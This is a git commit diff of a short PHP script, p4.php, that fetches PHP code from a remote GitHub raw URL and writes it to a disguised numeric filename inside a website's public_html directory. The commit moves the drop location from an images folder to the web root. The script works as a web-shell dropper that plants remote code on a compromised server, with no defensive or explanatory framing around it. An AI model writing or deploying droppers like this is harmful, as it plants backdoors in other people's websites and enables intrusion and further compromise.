c41a9fee57d7a8002126c41d1c7e83b85588a092
zzqwq555 <45870079+zzqwq555@users.noreply.github.com>
2018-12-17 15:06:32 +0800

    Update p4.php

--- p4.php
+++ p4.php
@@ -2,4 +2,4 @@
 //https://github.com/zzqwq555/t1/raw/master/help.zip
 //https://raw.githubusercontent.com/zzqwq555/t1/master/p2.php
 $code=file_get_contents('https://raw.githubusercontent.com/zzqwq555/t1/master/p2.php');
-file_put_contents('/home/home/mco/basiclaw/public_html/images/activity/201802141020140.php',$code);
+file_put_contents('/home/home/mco/basiclaw/public_html/201802141020140.php',$code);
